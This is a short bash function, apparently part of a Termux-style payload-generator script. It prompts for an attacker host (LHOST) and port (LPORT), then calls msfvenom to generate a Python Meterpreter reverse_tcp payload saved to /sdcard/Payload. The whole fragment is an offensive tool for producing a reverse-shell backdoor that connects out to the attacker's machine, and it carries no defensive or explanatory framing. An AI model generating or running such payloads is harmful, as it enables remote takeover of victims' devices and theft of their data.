p() {
	echo
	random
	echo -e -n "Enter LHOST \033[0m"
	read a
	if [ $a ];then
	echo
	random
	echo -e -n "Enter LPORT\033[0m "
	read b
	msfvenom -p python/meterpreter/reverse_tcp LHOST=$a LPORT=$b R > /sdcard/Payload/python-pyload.py
	random
					printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
					toilet -f font -F metal Exiting
					fi
					}
	p